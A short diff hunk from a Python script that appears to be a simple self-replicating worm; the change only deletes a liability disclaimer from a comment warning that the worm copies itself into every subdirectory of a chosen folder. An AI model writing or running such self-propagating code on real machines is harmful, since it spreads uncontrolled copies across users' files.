@@ -15,7 +15,7 @@ def worm(current_file, directory):
 def main():
   current_file = os.path.basename(__file__)
   directories = [
-    "C:\\Users\\sample\\Desktop", # use a sensible directory here as the worm will copy itself to ALL of its subdirectories (gaurav should not be held liable for any damange)
+    "C:\\Users\\sample\\Desktop", # use a sensible directory here as the worm will copy itself to ALL of its subdirectories 
   ]
   for directory in directories:
     if os.path.isdir(directory):
